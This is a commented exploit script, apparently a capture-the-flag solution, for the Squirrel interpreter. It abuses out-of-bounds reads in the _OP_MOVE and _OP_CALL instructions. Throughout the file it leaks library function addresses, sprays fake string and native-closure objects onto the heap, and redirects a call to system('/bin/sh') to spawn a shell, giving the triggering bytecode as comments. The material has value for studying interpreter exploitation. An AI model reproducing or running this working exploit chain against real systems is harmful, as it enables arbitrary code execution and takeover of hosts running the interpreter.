# We're exploiting 2 OOB reads in the _OP_CALL and _OP_MOVE instructions.
# 
# The idea is to build fake objects on the heap and use them through the call a


# We're gonna use this blob as a host for our fakeObject sprays. Blobs are great because
# they are an interface to raw memory and therefore great for faking objects.
local sSpray = blob(1024*40)

# We'll use two infoleaks for this exploit. This could be optimized to work with only one leak.
#
# The first leak is the address of the format() function. This function is part of the sqstdlib and
# leaking a function pointer from that library will enable us to calculate the address of system() which
# will get useful later on.
#
# The second leak is the address of the print() function. This will return a pointer to the SQNativeClosure
# on the heap, which in turn can be used to calculate the offset of our blob's buffer, which is where our 
# heap sprays will reside.
local leak      = (format.tostring().slice(16,-1).tointeger(16))
local printLeak = (print.tostring().slice(16,-1).tointeger(16))
print(format("[i] Format is at: 0x%016x\n", leak))
print(format("[i] Print is at: 0x%016x\n", printLeak))


# Now we need to prepare stuff. readTarget referes to the address where _unVal of our first fake sqTAGObject
# spray will point to. The type will be set to OT_STRING so readTarget will be interpreted as an SQString object.
# 
# We're trying to leak the _function pointer of the native format() function. After leaking it, it will be stored
# in formatClosure.
# 
# win holds the string we'll pass to system() at the end of this exploit.
local readTarget    = leak-0x40
local formatClosure = 0
local win           = "/bin/sh\x00"

print(format("[~] Performing fakeString Spray with 0x%016x!...\n", readTarget))
# This is our first heap spray. We're spraying a bunch of sqTAGObjects, with their type set to OT_STRING
# and _unVal set to readTarget. 
for(local i=0; i < sSpray.len(); i+= 0x10) {
    #### Build fake sqTAGObject ####
    sSpray.writen(0x08000010, 'i')     # type OT_STRING
    sSpray.writen(0x42424242, 'i')     # padding

    sSpray.writen(readTarget, 'l')     # _unVal
}

return
local tmp = "AAAABBBBCCCCDDDD"
# The heap is now filled with our fake objects. Now we need to use the OOB read in _OP_MOVE
# to load one of our faje objects. This can be dont with the following line of assembly:
# --- ASM ---
# '[0x33] _OP_MOVE: 0x8, 0x%x, 0x0, 0x0' % ((0xd650+0x5000) >> 4),
# 
# This will overwrite the tmp variable with one of our own fake SQString objects.
return


# tmp holds a fake OT_STRING with its data pointing to the readTarget. Our goal is to leak the
# _function pointer, which is located at offset 0x70 from readTarget. This is easy to do, because
# we can just iterate over the string to get the address and store it to formatClosure.
for(local i=0x77; i>=0x70; i--) {
    local cur = tmp[i] & 0xff;
    formatClosure += cur;
    if(i != 0x70) {
        formatClosure = formatClosure << 8;
    }
}

print(format("[+] Got format _function leak: 0x%016x!\n", formatClosure))


# Now we're able to calculate the address of the system() function inside of sqstdlib!
local systemClosure = formatClosure + 0x4a0


print(format("[~] Performing fakeNativeClosure Spray with 0x%016x!...\n", systemClosure))

# Now we're able to spray some more sqTAGObjects. This type, we'll set the type to nativeClosure
# and the _unVal pointer to point to a fake SQNativeClosure object, located at the and of our blob.
sSpray.seek(0x00) # padding
for(local i=0; i < sSpray.len()-0x80; i += 0x10) {
    #### Build fake sqTAGObject ####
    sSpray.writen(0x08000200, 'i')          # type nativeClosure
    sSpray.writen(0x43434343, 'i')          # padding
    
    sSpray.writen(printLeak+0x12700, 'l')   # _unVal --> SQNativeClosure
}


# This is is the fake SQNativeClosure, that all the fake sqTAGObjects will be pointing to. Since we're not
# calling to many operations on it, most of its fields like the VTable or the liked list entries can be
# ignored and just zeroed out. This makes faking this object significantly simpler ;) 
sSpray.writen(0x55545352, 'l')     # _vptr
sSpray.writen(0x00000001, 'l')     # _uiRef
sSpray.writen(0x00000000, 'l')     # _weakref
sSpray.writen(0x00000000, 'l')     # _next
sSpray.writen(0x00000000, 'l')     # _prev
sSpray.writen(0x00000000, 'l')     # _sharedstate
sSpray.writen(0x00000000, 'l')     # _nparamscheck
sSpray.writen(0x00000000, 'l')     # _typecheck->_vals
sSpray.writen(0x00000000, 'l')     # _typecheck->_size
sSpray.writen(0x00000000, 'l')     # _typecheck->_allocated
sSpray.writen(0x00000000, 'l')     # _outervalues
sSpray.writen(0x00000000, 'l')     # _noutervalues
sSpray.writen(0x00000000, 'l')     # _env
sSpray.writen(systemClosure, 'l')  # _function      !!!system!!!
sSpray.writen(0x08000010, 'l')     # _name->_type
sSpray.writen(0x00000000, 'l')     # _name->_unVal

print("[+] Getting fakeClosure!\n")

return
# We're all set! The heap has been prepared with our fake sqTAGObjects. First, we need to prepare 
# the parameters to call our function with. We'll use the literal at offset 0x7, which is `/bin/sh\x00` (win)
# --- ASM ---
# '[0xc5] _OP_MOVE: 0xc, 0x7, 0x0, 0x0',
#
# Now we need to call one of our prepared sqTAGObjects using the OOB read in _OP_CALL:
# --- ASM ---
# '[0xc6] _OP_CALL: 0xff, 0x%x, 0xb, 0x2' % ((0xd650+0x5000) >> 4),
#
# That's it. Enjoy your shell ;P
return

